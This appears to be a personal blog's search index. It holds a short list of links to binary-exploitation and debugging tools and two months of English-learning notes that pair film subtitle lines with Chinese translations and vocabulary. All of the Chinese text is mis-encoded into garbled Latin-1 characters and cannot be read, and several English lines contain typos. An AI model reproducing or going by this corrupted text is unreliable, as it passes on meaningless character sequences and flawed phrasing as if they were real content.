<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Treasure House</title>
      <link href="/6666/06/06/Treasure-House/"/>
      <url>/6666/06/06/Treasure-House/</url>
      
        <content type="html"><![CDATA[<p>idaè”åŠ¨gdb</p><p><a href="https://github.com/mahaloz/decomp2dbg">https://github.com/mahaloz/decomp2dbg</a></p><p>è¿½è¸ªå †</p><p><a href="https://github.com/Arinerron/heaptrace">https://github.com/Arinerron/heaptrace</a></p><p>pwn dockerç°æˆç¯å¢ƒ</p><p><a href="https://github.com/skysider/pwndocker">https://github.com/skysider/pwndocker</a></p><p>æ ¹æ®libc.soè‡ªåŠ¨ä¸‹è½½ldå’Œdbgsym</p><p><a href="https://github.com/veritas501/dl_dbgsym">https://github.com/veritas501/dl_dbgsym</a></p><p>è‡ªåŠ¨pwnæ„å»º</p><p><a href="https://github.com/io12/pwninit">https://github.com/io12/pwninit</a></p><p>iot è™šæ‹Ÿæœº</p><p><a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a></p><p>ç¼–è¯‘å¥½çš„gdbsever</p><p><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries">https://github.com/rapid7/embedded-tools/tree/master/binaries</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>English learning September 2023</title>
      <link href="/2223/09/01/Englishlearning-September2023/"/>
      <url>/2223/09/01/Englishlearning-September2023/</url>
      
        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>46å¤©äº†ï¼Œç›®å‰å·²ç»å…»æˆäº†ä¹ æƒ¯ï¼Œç›®çš„å·²ç»è¾¾åˆ°ï¼Œä¸ä¼šå†è®°å½•äº†,æ”¶è·è‰¯å¤šï¼Œkeep running   2023.9.16 grxer</p><h2 id="9-1"><a href="#9-1" class="headerlink" title="9.1"></a>9.1</h2><p><a href="https://www.bilibili.com/video/BV1dj411K7Bs/">https://www.bilibili.com/video/BV1dj411K7Bs/</a></p><p>i want you to listen very closely to what iâ€™m about to say. </p><p>from this moment on ,you are a rock</p><p>ä½ è¦ä»”ç»†å¬å¥½æˆ‘æ¥ä¸‹å•¦è¯´çš„è¯ï¼Œä»è¿™ä¸€åˆ»èµ·ï¼Œä½ å°±æ˜¯ä¸€å—å²©çŸ³</p><p>you absorb nothing ,you say nothing and nothing breaks you.is that clear</p><p>ä¸é—»ä¸é—®ï¼Œä¸è¨€ä¸è¯­ï¼Œåšä¸å¯æ‘§ï¼Œæ˜ç™½äº†å—</p><p>yes sir</p><ul><li>absorb v. æ‰¿æ‹… å¸æ”¶ï¼›ä½¿å¹¶å…¥ï¼Œçº³å…¥ï¼›åŒåŒ–ï¼Œæ±²å–</li></ul><h2 id="9-2"><a href="#9-2" class="headerlink" title="9.2"></a>9.2</h2><p><a href="https://www.bilibili.com/video/BV1p24y1s7RU">https://www.bilibili.com/video/BV1p24y1s7RU</a></p><p>i was very sorry to here about gerryâ€™s father</p><p>gerryçˆ¶äº²çš„äº‹æƒ…æˆ‘å¾ˆéš¾è¿‡</p><p>iâ€™ll go to the funeral with you ,if you like</p><p>å¦‚æœä½ æ„¿æ„ï¼Œæˆ‘ä¼šè·Ÿä½ å»è‘¬ç¤¼</p><p>there isnâ€™t gonne be funeralã€‚just a memorial serviceï¼Œthen theyâ€™ll scatter his a ashesï¼Œthatâ€™s how they do it</p><p>æ²¡æœ‰åŠè‘¬ç¤¼ï¼Œåªæœ‰è¿½æ‚¼ä¼šã€‚ç„¶åä»–ä»¬ä¼šæŠŠéª¨ç°æ•£æ‰ï¼Œå¤§è‡´å°±æ˜¯è¿™æ ·</p><ul><li><p>funeral n.è‘¬ç¤¼</p><p>be someoneâ€™s funeral è‡ªä½œè‡ªå—</p><p>i told you to work hard,but you always turned a deaf ears to me ,itâ€™s your funeral</p><p>æˆ‘å‘Šè¯‰è¿‡ä½ è¦åŠªåŠ›å·¥ä½œï¼Œä½†æ˜¯ä½ æ€»å½“è€³æ—é£ï¼Œè¿™æ˜¯ä½ è‡ªä½œè‡ª</p></li></ul><h2 id="9-3"><a href="#9-3" class="headerlink" title="9.3"></a>9.3</h2><p><a href="https://www.bilibili.com/video/BV148411M7ef">https://www.bilibili.com/video/BV148411M7ef</a></p><p>the chanel look that i had last march in paris</p><p>æˆ‘å»å¹´ä¸‰æœˆåœ¨å·´é»çš„é¦™å¥ˆå„¿é€ å‹ã€‚</p><p>i had a black puffy jacket with the subtle Chanel logo and a matching set inside a cute mini skirt and a corset</p><p>æˆ‘ç©¿äº†ä¸€ä»¶è“¬æ¾çš„ï¼Œæœ‰ç€ä¸æ˜¯å¾ˆæ˜æ˜¾çš„é¦™å¥ˆå„¿æ ‡å¿—çš„å¤¹å…‹å¤–å¥—ï¼Œé‡Œé¢æ­äº†æ¼‚äº®çš„è¿·ä½ è£™å’Œç´§èº«è¡£ã€‚</p><p>i did this really cute braided hair that iâ€™ver never tried before,but turned out to be really amazing.i loved it.</p><p>æˆ‘å¼„äº†ä¸ªéå¸¸å¯çˆ±çš„ç¼–å‘æ˜¯æˆ‘ä¹‹å‰æ²¡å°è¯•è¿‡çš„ï¼Œä½†æ˜¯å¾ˆæ£’ï¼Œæˆ‘å¾ˆå–œæ¬¢</p><ul><li><p>puffy è‚¿èƒ€çš„ï¼Œè“¬æ¾çš„</p><p>iâ€™ll wake up the next morning with really puffy eyes</p><p>ç¬¬äºŒå¤©æ—©ä¸Šæˆ‘èµ·æ¥çœ¼ç›ä¼šè‚¿</p></li></ul><h2 id="9-4"><a href="#9-4" class="headerlink" title="9.4"></a>9.4</h2><p><a href="https://www.bilibili.com/video/BV1tM411P7HX">https://www.bilibili.com/video/BV1tM411P7HX</a></p><p>i took you advice,i wanted something ,and i went for it</p><p>æˆ‘æ¥å—äº†ä½ çš„å»ºè®®ã€‚æˆ‘æƒ³è¦ä»€ä¹ˆï¼Œå°±å»äº‰å–ã€‚</p><p>i made the selfish move ,and i ended up fighting a  zombie</p><p>ç”±äºè¿™äº›è‡ªç§çš„ä¸¾åŠ¨ï¼Œæœ€åæˆ‘å’Œåƒµå°¸æ‰“äº†èµ·æ¥</p><p>thereâ€™s room for people in this world that just care about other perple</p><p>è¿™ä¸ªä¸–ç•Œä¸Šè¿˜æœ‰ä½ç½®ç»™é‚£äº›åªå…³å¿ƒåˆ«äººçš„äºº</p><p>Not everyone has to be a showboat</p><p>ä¸æ˜¯æ¯ä¸ªäººéƒ½è¦æˆä¸ºç„¦ç‚¹ã€‚</p><p>youâ€˜re rightã€‚this world needs the selfless and selfish to keep spinning</p><p>æ²¡é”™ã€‚è¿™ä¸ªä¸–ç•Œéœ€è¦æ— ç§çš„äººå’Œè‡ªç§çš„äººæ‰èƒ½ç»§ç»­è½¬åŠ¨ã€‚</p><ul><li><p>end up æœ€ç»ˆ</p><p>you can end up hiding from each other</p><p>ä½ ä»¬æœ€ç»ˆä¼šç›¸äº’èº²é¿</p></li><li><p>showboat n.çˆ±å–å¼„çš„äºº v.å–å¼„ï¼Œç‚«è€€</p><p>other statemen loved to showboat</p></li></ul><h2 id="9-5"><a href="#9-5" class="headerlink" title="9.5"></a>9.5</h2><p><a href="https://www.bilibili.com/video/BV1bG4y1P7LK/">https://www.bilibili.com/video/BV1bG4y1P7LK/</a></p><p>he broke up with you over text messageï¼Œitâ€˜s kinda like firing someone over the internet</p><p>ä»–å‘çŸ­ä¿¡å’Œä½ åˆ†æ‰‹ï¼Ÿæœ‰ç‚¹åƒåœ¨ç½‘ä¸Šè§£é›‡åˆ«äººã€‚</p><p>what a weaselly prick</p><p>çœŸæ˜¯ä¸ªç‹¡çŒ¾çš„æ··è›‹ã€‚</p><p>yeahï¼Œbut what dose that make meï¼Ÿsomeone who falls for a prick</p><p>æ˜¯å•Šï¼Œä½†æˆ‘åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿçˆ±ä¸Šæ··è›‹çš„äººã€‚</p><p>we all fall for themã€‚pricks are spontaneousã€‚theyâ€™re unpredictable and theyâ€˜re fun</p><p>æˆ‘ä»¬éƒ½å–œæ¬¢æ··è›‹ã€‚æ··è›‹éšæ„è‡ªç„¶ã€‚ä»–ä»¬æ‰æ‘¸ä¸é€ä¹Ÿå¾ˆæœ‰è¶£ã€‚</p><ul><li>weaselly ç‹¡çŒ¾çš„</li><li>prick æ··è›‹</li><li>fall for è¿·æ‹ä¸Š</li><li>spontaneous è‡ªç„¶çš„ï¼Œéšæ„çš„</li></ul><h2 id="9-6"><a href="#9-6" class="headerlink" title="9.6"></a>9.6</h2><p><a href="https://www.bilibili.com/video/BV1Y54y1P7eo/">https://www.bilibili.com/video/BV1Y54y1P7eo/</a></p><p>i get up in the morning to do this job i donâ€™t even like .and Iâ€™m doing it just for the monry and itâ€™s not even a lotta money</p><p>æˆ‘ä¸€å¤§æ—©èµ·æ¥å°±è¦å»åšè¿™ä¸ªæˆ‘æ ¹æœ¬ä¸å–œæ¬¢çš„å·¥ä½œã€‚æˆ‘åªæ˜¯ä¸ºäº†èµšé’±æ‰åšçš„ï¼Œè¿˜èµšä¸äº†å¤šå°‘ã€‚</p><p>i keep trying harder and harder and it doesnâ€™t even make a difference</p><p>æˆ‘ä¸€ç›´ä¸åœçš„åŠªåŠ›ï¼Œä½†ä¸€ç‚¹ç”¨éƒ½æ²¡æœ‰ã€‚</p><p>so if youâ€™re going to yell at me or punish me letâ€™s just get it over with.</p><p>æ‰€ä»¥å¦‚æœä½ è¦éª‚æˆ‘æˆ–è€…æƒ©ç½šæˆ‘ï¼Œé‚£å°±èµ¶ç´§æ¥å§ã€‚</p><ul><li>yell at sb å¤§å£°è´£éª‚ï¼Œå‘µæ–¥ï¼šå¯¹æŸäººå‘ç«</li></ul><h2 id="9-7"><a href="#9-7" class="headerlink" title="9.7"></a>9.7</h2><p><a href="https://www.bilibili.com/video/BV13T411U7gE/">https://www.bilibili.com/video/BV13T411U7gE/</a></p><p>so,how did you guys meet?</p><p>æ‰€ä»¥ï¼Œä½ ä»¬æ˜¯æ€ä¹ˆè®¤è¯†çš„ï¼Ÿ</p><p>At a conference.i mean can you believe it?Sheâ€™s a rocket scientist</p><p>åœ¨ä¸€ä¸ªå¤§å‹ä¼šè®®ä¸Šã€‚ä½ ä¿¡å—ï¼Ÿå¥¹æ˜¯ä¸ªç«ç®­ç§‘å­¦å®¶ã€‚</p><p>No,iâ€™m not.</p><p>ä¸ï¼Œæˆ‘ä¸æ˜¯</p><p>yes you are.</p><p>ä½ å°±æ˜¯å•Š</p><p>iâ€™m actually just an engineerï¼Œbut he loves to say that</p><p>æˆ‘å…¶å®åªæ˜¯ä¸ªå·¥ç¨‹å¸ˆï¼Œä½†ä»–å–œæ¬¢è¿™ä¹ˆæ§æˆ‘ã€‚</p><h2 id="9-8"><a href="#9-8" class="headerlink" title="9.8"></a>9.8</h2><p><a href="https://www.bilibili.com/video/BV1Ju4y1F7ki/">https://www.bilibili.com/video/BV1Ju4y1F7ki/</a></p><p>the bitter irony of the fact that 10 year old me is far cooler than 20 year old me</p><p>æˆ‘åå²çš„æ—¶å€™æ¯”äºŒåå²çš„æ—¶å€™è¿˜é…·ï¼Œè¿™æ˜¯ä¸ªè¾›è¾£çš„è®½åˆº</p><p>I think 20 year old dave isâ€¦Heâ€™s all right</p><p>æˆ‘è§‰å¾—äºŒåå²çš„DaveæŒºå¥½çš„å•Š</p><p>Like â€œall rightâ€ all right or â€all right â€ all right?</p><p>æ˜¯â€è¿˜å‡‘åˆâ€çš„é‚£ç§å¥½ï¼Œè¿˜æ˜¯â€å¤ªæ£’äº†â€çš„é‚£ç§å¥½</p><p>I think he is somewhere in the middle</p><p>æˆ‘è§‰å¾—ä»–â€¦.. ä»‹äºä¸¤è€…ä¹‹é—´å§</p><p>thatâ€™s a diplomatic answer</p><p>çœŸå·§å¦™çš„å›ç­”</p><h2 id="9-9"><a href="#9-9" class="headerlink" title="9.9"></a>9.9</h2><p><a href="https://www.bilibili.com/video/BV16A411274T/">https://www.bilibili.com/video/BV16A411274T/</a></p><p>The childhood dream of playing for my hometown team came true in 2004</p><p>åœ¨04å¹´ï¼Œæˆ‘ç»ˆäºå®ç°äº†ä¸ºå®¶ä¹¡çƒé˜Ÿæ•ˆåŠ›çš„æ¢¦æƒ³ã€‚</p><p>at that time it felt like the beginning of a new chapter</p><p>æˆ‘æœ¬ä»¥ä¸ºè¿™å°†å¼€å§‹æˆ‘äººç”Ÿçš„æ–°ç¯‡ç« ã€‚</p><p>but little did i know,this would be the beginning of the end</p><p>ä½†æˆ‘ä¸çŸ¥é“çš„æ˜¯ï¼Œè¿™å…¶å®æ˜¯ç»ˆç« çš„åˆ°æ¥ã€‚</p><p>during the game we palyed against the phoenix suns on the night fo december secnod,2007(two thousand and seven)</p><p>2007å¹´12æœˆ2æ—¥æ™šä¸Šï¼Œæˆ‘ä»¬ä¸»åœºè¿æˆ˜å‡¤å‡°åŸå¤ªé˜³é˜Ÿï¼Œ</p><p>My father in attendance was rushed to the hospital with chest pains</p><p>çœ‹å°ä¸Šçš„çˆ¶äº²çªå‘å¿ƒè„ç—…è¢«é€å¾€åŒ»é™¢ã€‚</p><h2 id="9-10"><a href="#9-10" class="headerlink" title="9.10"></a>9.10</h2><p><a href="https://www.bilibili.com/video/BV1Vj411P7Dv">https://www.bilibili.com/video/BV1Vj411P7Dv</a></p><p>About that â€¦</p><p>å…³äºé‚£ä¸ªâ€¦â€¦</p><p>oh, save you breathï¼Œwe know you lied ,youâ€™re terrible liar</p><p>çœçœå§ï¼Œæˆ‘ä»¬çŸ¥é“ä½ åœ¨æ’’è°ã€‚ä½ çœŸä¸ä¼šæ’’è°ã€‚</p><p>if you knew i lied ,then why would you help me</p><p>æ—¢ç„¶ä½ ä»¬çŸ¥é“æˆ‘åœ¨æ’’è°ï¼Œä¸ºä»€ä¹ˆè¿˜è¦å¸®æˆ‘ï¼Ÿ</p><p>we donâ€™t need a reason to torment mortal boys</p><p>æŠ˜ç£¨å‡¡ç•Œç”·å­ä¸éœ€è¦ç†ç”±ã€‚</p><p>but if you are transferring to the Academy ,why bother with the boys at all</p><p>ä½†å¦‚æœä½ è¦è½¬æ¥å­¦é™¢ï¼Œå¹²å˜›è¿˜è¦ç®¡é‚£äº›ç”·ç”Ÿï¼Ÿ</p><p>theyâ€™ll soon be out of you life</p><p>i donâ€™t want them harassing my friends when iâ€™m gone</p><p>ä»–ä»¬é©¬ä¸Šå°±ä¸ä½ æ— å…³äº†ã€‚æˆ‘ä¸æƒ³ä»–ä»¬åœ¨æˆ‘èµ°åéªšæ‰°æˆ‘æœ‹å‹ã€‚</p><ul><li>save you breath çœçœå£èˆŒ</li></ul><h2 id="9-11"><a href="#9-11" class="headerlink" title="9.11"></a>9.11</h2><p><a href="https://www.bilibili.com/video/BV1oT411U75J">https://www.bilibili.com/video/BV1oT411U75J</a></p><p>Okay,i get it. you guys think iâ€™m a terrible mother</p><p>æˆ‘æ‡‚äº†ã€‚ä½ ä»¬è§‰å¾—æˆ‘è¿™ä¸ªå¦ˆå½“çš„ä¸ç§°èŒã€‚</p><p>I work long hours ,i canâ€™t be home</p><p>æ²¡æœ‰ã€‚æˆ‘å¤©å¤©åŠ ç­ï¼Œæ²¡åŠæ³•åœ¨å®¶ã€‚</p><p>you produce a morning cooking show</p><p>ä½ åˆ¶ä½œçš„æ˜¯ä¸€ä¸ªæ—©é—´çƒ¹é¥ªèŠ‚ç›®ã€‚</p><p>you get off at 1:00 every day</p><p>ä½ æ¯å¤©ä¸‹åˆä¸€ç‚¹å°±ä¸‹ç­äº†</p><p>Yeah that is true</p><p>ç¡®å®</p><p>but itâ€™s a hight stress job,Okay ? And i need time to decompress before i go home ,before they go to bed</p><p>ä½†æ˜¯è¿™ä¸ªå·¥ä½œå‹åŠ›å¯å¤§äº†ã€‚æˆ‘éœ€è¦åœ¨æˆ‘å›å®¶å‰,åœ¨ä»–ä»¬ç¡è§‰å‰æ¶ˆåŒ–å®Œè¿™äº›ã€‚</p><h2 id="9-12"><a href="#9-12" class="headerlink" title="9.12"></a>9.12</h2><p><a href="https://www.bilibili.com/video/BV11M4y1Z7jP">https://www.bilibili.com/video/BV11M4y1Z7jP</a></p><p>wait a minuite ,whatâ€™s your name</p><p>ç­‰ç­‰ï¼Œä½ å«ä»€ä¹ˆåå­—ï¼Ÿ</p><p>letâ€™s keep that a secret</p><p>è®©æˆ‘ä»¬ä¿å®ˆç§˜å¯†å§ã€‚</p><p>i donâ€™t even know it</p><p>æˆ‘éƒ½ä¸çŸ¥é“ä½ çš„åå­—å•Šã€‚</p><p>well ,then youâ€™ll keep it even better</p><p>é‚£ä½ å®ˆå¾—æ›´å¥½äº†ã€‚</p><p>what you star signï¼Ÿiâ€˜m an experienced astronomerã€‚</p><p>ä½ æ˜¯ä»€ä¹ˆæ˜Ÿåº§çš„ï¼Ÿæˆ‘æ˜¯ä¸ªç»éªŒä¸°å¯Œçš„å¤©æ–‡å­¦å®¶ã€‚</p><p>you try piscesï¼Œthe fish</p><p>åŒé±¼åº§</p><h2 id="9-13"><a href="#9-13" class="headerlink" title="9.13"></a>9.13</h2><p><a href="https://www.bilibili.com/video/BV1Ns4y187Ab/">https://www.bilibili.com/video/BV1Ns4y187Ab/</a></p><p>Can i help you</p><p>Check this book out </p><p>Okey ,do you have a library card</p><p>do you live in town</p><p>æˆ‘å¯ä»¥å¸®ä½ å—ï¼Ÿå€Ÿè¿™æœ¬ä¹¦ã€‚å¥½çš„ï¼Œå—¯ï¼Œä½ æœ‰å€Ÿä¹¦å¡å—ï¼Ÿæ²¡æœ‰ã€‚å¥½çš„ï¼Œä½ ä½åœ¨é•‡ä¸Šå—ï¼Ÿæ˜¯çš„ã€‚</p><p>i need a proof of address.so if you could bring in a piece of mail,then i can give you a card</p><p>æˆ‘éœ€è¦ä¸€ä¸ªåœ°å€è¯æ˜ï¼Œæ‰€ä»¥è¦æ˜¯ä½ èƒ½å¸¦æ¥ä¸€å°é‚®ä»¶ï¼Œæˆ‘å°±èƒ½ç»™ä½ å¼ å¡ã€‚</p><h2 id="9-14"><a href="#9-14" class="headerlink" title="9.14"></a>9.14</h2><p><a href="https://www.bilibili.com/video/BV1dX4y197Ce/">https://www.bilibili.com/video/BV1dX4y197Ce/</a></p><p>youâ€™re gonna walk to boston,how long is that gonna take?</p><p>ä½ ä»¬å‡†å¤‡èµ°åˆ°Boston? è¿™è¦å¤šä¹…å•Šï¼Ÿ</p><p>eight,eight and a half months</p><p>å…«ä¸ªï¼Œå…«ä¸ªåŠæœˆ</p><p>so into the winter</p><p>æ‰€ä»¥ è¦åˆ°å†¬å¤©ï¼Ÿ</p><p>what if you donâ€™t make it that far</p><p>å¦‚æœä½ ä»¬èµ°ä¸åˆ°é‚£ä¹ˆè¿œæ€ä¹ˆåŠï¼Ÿ</p><p>then weâ€™ll hole up somethere</p><p>é‚£æˆ‘ä»¬å°±èº²åœ¨æŸä¸ªåœ°æ–¹</p><p>Where? Whoâ€™s gonna take in an extra half-dozen starving people for the winter?</p><p>å“ªé‡Œï¼Ÿè°ä¼šåœ¨å†¬å¤©é‡Œå†æ¥çº³å‡ ä¸ªé¤“å¾—è¦å‘½çš„äººå‘¢ï¼Ÿ</p><h2 id="9-15"><a href="#9-15" class="headerlink" title="9.15"></a>9.15</h2><p><a href="https://www.bilibili.com/video/BV1tg4y1J7V9/">https://www.bilibili.com/video/BV1tg4y1J7V9/</a></p><p>whatâ€™s the biggest suprise youâ€™ve ever had</p><p>ä½ æ›¾æœ‰è¿‡çš„æœ€å¤§æƒŠå–œæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>my mom brought home a child from  a yard sale once,true story</p><p>æˆ‘å¦ˆæœ‰æ¬¡åœ¨åº­é™¢æ‹å–ä¼šä¸Šå¸¦å›æ¥ä¸ªå­©å­ï¼ŒçœŸçš„ã€‚</p><p>whatâ€™s a suprise that make you cry,stubbing my toe</p><p>ä½ æ‰€ç­–åˆ’çš„ç»™æŸäººæœ€å¥½çš„æƒŠå–œæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>um a collection of short stories writeen by loved one for my husband</p><p>ä¸€ä¸ªç”±äº²äººå†™ç»™æˆ‘è€å…¬çš„çŸ­ç¯‡å°è¯´é›†ã€‚</p><p>whatâ€™s you favorite plot twist? vertigon</p><p>ä½ æœ€çˆ±çš„æ›²æŠ˜æƒ…èŠ‚æ˜¯ï¼ˆå“ªéƒ¨ç”µå½±çš„ï¼‰ï¼Ÿã€Šè¿·é­‚è®°ã€‹ã€‚</p><h2 id="9-16"><a href="#9-16" class="headerlink" title="9.16"></a>9.16</h2><p><a href="https://www.bilibili.com/video/BV1DT411e7Ka">https://www.bilibili.com/video/BV1DT411e7Ka</a></p><p>Iâ€™am not the only one whoâ€™s worried</p><p>æˆ‘ä¸æ˜¯å”¯ä¸€æ‹…å¿ƒä½ çš„äººã€‚</p><p>oh my godï¼Œmy parents, tell me they didnâ€™t reach out to you</p><p>è€å¤©ï¼Œæˆ‘çš„çˆ¶æ¯â€¦â€¦åˆ«å‘Šè¯‰æˆ‘ä»–ä»¬è”ç³»ä½ äº†ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>English learning August 2023</title>
      <link href="/2223/08/01/Englishlearning-August2023/"/>
      <url>/2223/08/01/Englishlearning-August2023/</url>
      
        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>emmï¼Œå¤§æ¦‚å¾ˆä¹…ä»¥å‰å°±æ„è¯†åˆ°è‹±æ–‡çš„é‡è¦ï¼Œä½†æ˜¯æ²¡åšæŒä¸‹æ¥è¿‡ğŸ˜‚ï¼Œç§¯ç¡…æ­¥è‡³åƒé‡Œï¼Œç§¯å°æµæˆæ±Ÿæµ·   2023.8.1 grxer</p><h2 id="8-1"><a href="#8-1" class="headerlink" title="8.1"></a>8.1</h2><p><a href="https://www.bilibili.com/video/BV1Uk4y13716/">https://www.bilibili.com/video/BV1Uk4y13716/</a></p><p>I suppose i mentally began becoming barbie as soon as i read the script ,i just couldnâ€™t.., not read the script , and be like playing it out in my head ,and kinda trying it on ,and seeing if it fit ,and like ,â€œoh how am i gonna do whatï¼Ÿâ€ </p><p>æˆ‘è§‰å¾—åˆšä¸€è¯»å®Œå‰§æœ¬ï¼Œæˆ‘å°±ç²¾ç¥ä¸ŠæŠŠè‡ªå·±å¸¦å…¥åˆ°èŠ­æ¯”äº†ã€‚æˆ‘åªæ˜¯ä¸èƒ½..ï¼Œæ²¡è¯»å‰§æœ¬ï¼Œæˆ‘å°±ä¼šåœ¨è„‘æµ·é‡Œæè¿°é‚£ä¸ªç”»é¢ï¼Œè¯•ä¸€ä¸‹çœ‹çœ‹æ˜¯å¦é€‚åˆæˆ‘ï¼Œä¼šæƒ³â€œæˆ‘ä¼šæ€ä¹ˆæ¥æ¼”?â€</p><ul><li><p>script n.å‰§æœ¬ï¼Œè®²ç¨¿</p><p>My editor didnâ€™t have time to edit my script last week</p><p>æˆ‘çš„ç¼–è¾‘ä¸Šå‘¨æ²¡æœ‰æ—¶é—´ç¼–è¾‘æˆ‘çš„å‰§æœ¬</p></li><li><p>play out é€æ¸å‘ç”Ÿ ç»“æŸ</p><p>there are plenty of ways this can play out</p><p>æœ‰éå¸¸å¤šçš„æ–¹æ³•å¯ä»¥è®©è¿™ä¸ªå‘ç”Ÿ</p></li></ul><blockquote><p>å¥å­ä¸­â€becomingâ€ï¼ˆç°åœ¨åˆ†è¯ï¼‰çš„ä½¿ç”¨å¼ºè°ƒäº†è¿™ä¸ªåŠ¨ä½œçš„æŒç»­æ€§ï¼Œæš—ç¤ºç€åœ¨é˜…è¯»å‰§æœ¬ä¹‹åï¼Œå¿ƒç†ä¸Šæ‰®æ¼”èŠ­æ¯”çš„è¿‡ç¨‹ç»§ç»­è¿›è¡Œç€ã€‚</p></blockquote><h2 id="8-2"><a href="#8-2" class="headerlink" title="8.2"></a>8.2</h2><p><a href="https://www.bilibili.com/video/BV16K41117Nc">https://www.bilibili.com/video/BV16K41117Nc</a></p><p>You know how much is gonna cost to fix that fridge </p><p>ä½ çŸ¥é“ä¿®å†°ç®±è¦èŠ±å¤šå°‘é’±ç </p><p>Two hundred dollars ,I have really good hearing</p><p>ä¸¤ç™¾ç¾å…ƒï¼Œæˆ‘å¬åŠ›å¾ˆå¥½</p><p>Do you have any idea how hard i work for the money we get?</p><p>ä½ çŸ¥é“èµšé’±æœ‰å¤šè¾›è‹¦å—</p><p>Iâ€˜m sorry</p><p>I donâ€™t care how long it takes ,Youâ€™re gonna pay me back every cent to this</p><p>æˆ‘ä¸ç®¡è¦å¤šä¹…ï¼Œä½ è¦æŠŠ(ä¿®å†°ç®±çš„)æ¯ä¸€åˆ†é’±è¿˜ç»™æˆ‘</p><h2 id="8-3"><a href="#8-3" class="headerlink" title="8.3"></a>8.3</h2><p><a href="https://www.bilibili.com/video/BV1t8411E7rb">https://www.bilibili.com/video/BV1t8411E7rb</a></p><p>what are you doing here</p><p>ä½ æ€ä¹ˆæ¥äº†</p><p>Officer Burke filled me in.You okay?</p><p>Burkeè­¦å®˜ç»™æˆ‘è®²äº†äº‹æƒ…çš„ç»è¿‡ï¼Œä½ æ²¡äº‹å§ </p><p>I passed my driving test. there is that</p><p>æˆ‘é©¾ç…§è€ƒè¯•è¿‡äº†ï¼Œå°±æ˜¯è¿™æ ·</p><p>Congratulation</p><p>æ­å–œ</p><p>Seriously what are you doing here</p><p>è®²çœŸçš„ï¼Œä½ æ¥è¿™å¹²å˜›</p><p>Came over the radio, there was a shooting, they mentioned your name</p><p>æˆ‘ä»æ— çº¿ç”µé‡Œå¬åˆ°å‘ç”Ÿäº†æªå‡»ï¼Œä»–ä»¬æåˆ°äº†ä½ çš„åå­—</p><ul><li><p>fill sb in å‘æŸäººæä¾›æƒ…å†µ</p><p>Anyone want to fill me in on what happened</p><p>æœ‰äººèƒ½å‘Šè¯‰æˆ‘å‘ç”Ÿä»€ä¹ˆäº†å—</p></li><li><p>shooting n.æªå‡» æªæ€</p><p>Recently just lost one of their other friends in a shooting</p><p>æœ€è¿‘åˆšåœ¨ä¸€æ¬¡æªå‡»ä¸­å¤±å»äº†ä¸€ä½æœ‹å‹</p></li><li><p>mention v.æåˆ° n.æåŠ</p><p>I mentioned it affects how we think about output</p><p>æˆ‘æåˆ°äº†ä»–ä¼šå½±å“æˆ‘ä»¬å¯¹äº§å‡ºçš„çœ‹æ³•</p></li></ul><h2 id="8-4"><a href="#8-4" class="headerlink" title="8.4"></a>8.4</h2><p><a href="https://www.bilibili.com/video/BV1gK411271R">https://www.bilibili.com/video/BV1gK411271R</a></p><p>Hey. Uh.I ordered mine whitout ketchup</p><p>å˜¿ï¼Œæˆ‘ç‚¹çš„æ˜¯ä¸è¦ç•ªèŒ„é…±çš„</p><p>Oh,right iâ€™ll be right back</p><p>å“¦ï¼Œå¯¹ï¼Œæˆ‘é©¬ä¸Šå›æ¥</p><p>No ketchup, thatâ€™s  very un-American</p><p>ä¸è¦ç•ªèŒ„é…±ï¼Œé‚£å¤ªä¸ç¾å›½äº†</p><p>iâ€™m full of surprises</p><p>æˆ‘å……æ»¡äº†æƒŠå–œ</p><p>so whatâ€™s your story then</p><p>èƒ½èŠèŠä½ çš„æ•…äº‹å—</p><p>my story?</p><p>æˆ‘çš„æ•…äº‹?</p><p>year,like your, your family? How you ended up here</p><p>å¯¹å•Šï¼Œæ¯”å¦‚ä½ çš„ï¼Œä½ çš„å®¶åº­ï¼Œä¸ºä»€ä¹ˆä¼šåˆ°è¿™</p><p>pass ï¼Œi just donâ€™t think aksing a abunch of arbitrary questions about someoneâ€™s past  is really gonna tell you who they are</p><p>ä¸èŠè¿™ä¸ªï¼Œæˆ‘åªæ˜¯è§‰å¾—é—®ä¸€å †ä»»æ„çš„å…³äºåˆ«äººè¿‡å»çš„é—®é¢˜ä¹Ÿä¸èƒ½çœŸçš„å°±äº†è§£ä»–ä»¬</p><ul><li><p>end up æœ€ç»ˆï¼Œæœ€ç»ˆåˆ°è¾¾</p><p>every would buy a plane ticket and end up in california</p><p>æ¯ä¸ªäººéƒ½å¯ä»¥ä¹°æœºç¥¨ç„¶åå»california</p></li><li><p>arbitrary ä»»æ„çš„ï¼Œæ­¦æ–­çš„</p><p>thatâ€™s not an arbitrary number</p><p>é‚£ä¸æ˜¯ä¸€ä¸ªä»»æ„çš„æ•°å­—</p></li></ul><h2 id="8-5"><a href="#8-5" class="headerlink" title="8.5"></a>8.5</h2><p><a href="https://www.bilibili.com/video/BV1uM41117jL">https://www.bilibili.com/video/BV1uM41117jL</a></p><p>Oh ,so sorry Iâ€™m late,Oh you wonâ€™t believe what happened,My neighbor had a massive fire in her kitchen,like a reall fire,And her cat just had five kittens,and she couldâ€™t find them all,I mean,what was i gonna do?</p><p>Not help her find the kittens</p><ul><li>massive éå¸¸ä¸¥é‡çš„ï¼›å¤§é‡çš„ï¼Œå¤§è§„æ¨¡çš„ï¼›</li><li>kitten å°çŒ«ï¼Œå¹¼å´½</li></ul><h2 id="8-6"><a href="#8-6" class="headerlink" title="8.6"></a>8.6</h2><p><a href="https://www.bilibili.com/video/BV1AM41117wC">https://www.bilibili.com/video/BV1AM41117wC</a></p><p>Apparently some guy you were stuck in the elevator with asked security for your contact info</p><p>è²Œä¼¼ä¹‹å‰å’Œä½ å›°åœ¨ç”µæ¢¯çš„äººå»æ‰¾ä¿å®‰é—®ä½ çš„è”ç³»æ–¹å¼äº†</p><p>Was it the delivery man?</p><p>æ˜¯é‚£ä¸ªé€è´§çš„å—</p><p>No,Um some big shot who works in the building ã€‚ I guss he has crush on you or 